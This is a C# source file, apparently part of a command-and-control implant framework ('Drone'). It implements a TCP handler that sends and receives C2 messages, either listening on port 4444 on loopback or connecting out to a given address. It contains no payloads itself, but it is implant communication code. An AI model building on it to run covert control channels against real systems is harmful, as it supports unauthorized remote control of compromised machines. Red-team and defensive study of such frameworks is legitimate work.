using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Handlers;

public sealed class TcpHandler : Handler
{
    public override event Func<IEnumerable<C2Message>, Task> OnMessagesReceived;

    private readonly HandlerMode _mode;
    private readonly IPAddress _address;
    private readonly int _port;

    private TcpClient _tcpClient;
    private CancellationTokenSource _tokenSource;
    
    private readonly ManualResetEvent _signal = new(false);

    public TcpHandler()
    {
        _port = BindPort;
        _mode = HandlerMode.Server;
    }

    public TcpHandler(int bindPort)
    {
        _port = bindPort;
        _mode = HandlerMode.Server;
    }

    public TcpHandler(IPAddress address, int port)
    {
        _address = address;
        _port = port;
        _mode = HandlerMode.Client;
    }

    public async Task Connect()
    {
        // only when in client mode
        _tcpClient = new TcpClient();
        await _tcpClient.ConnectAsync(_address, _port);
    }
    
    public override async Task Start()
    {
        _tokenSource = new CancellationTokenSource();
        
        switch (_mode)
        {
            case HandlerMode.Client:
            {
                await RunClient();
                break;
            }

            case HandlerMode.Server:
            {
                await RunServer();
                break;
            }

            default:
                throw new ArgumentOutOfRangeException();
        }
        
        _tcpClient?.Dispose();
    }

    private async Task RunServer()
    {
        var address = LoopbackOnly ? IPAddress.Loopback : IPAddress.Any;
        var endpoint = new IPEndPoint(address, BindPort);
        var listener = new TcpListener(endpoint);
        listener.Start(100);

        while (!_tokenSource.IsCancellationRequested)
        {
            _signal.Reset();

            _tcpClient = await listener.AcceptTcpClientAsync();
            await RunClient();
            _signal.WaitOne();
        }
        
        listener.Stop();
    }

    private async Task RunClient()
    {
        _signal.Set();

        while (!_tokenSource.IsCancellationRequested)
        {
            // read if there's data
            if (_tcpClient.Available > 0)
            {
                var inbound = await _tcpClient.GetStream().ReadStream();
                var messages = inbound.Deserialize<IEnumerable<C2Message>>();

                OnMessagesReceived?.Invoke(messages);
            }

            await Task.Delay(10);
        }
    }

    public override async Task SendMessages(IEnumerable<C2Message> messages)
    {
        await _tcpClient.GetStream().WriteStream(messages.Serialize());
    }

    public override void Stop()
    {
        _tokenSource.Cancel();
    }

    private static int BindPort => int.Parse("4444");
    private static bool LoopbackOnly => true;
}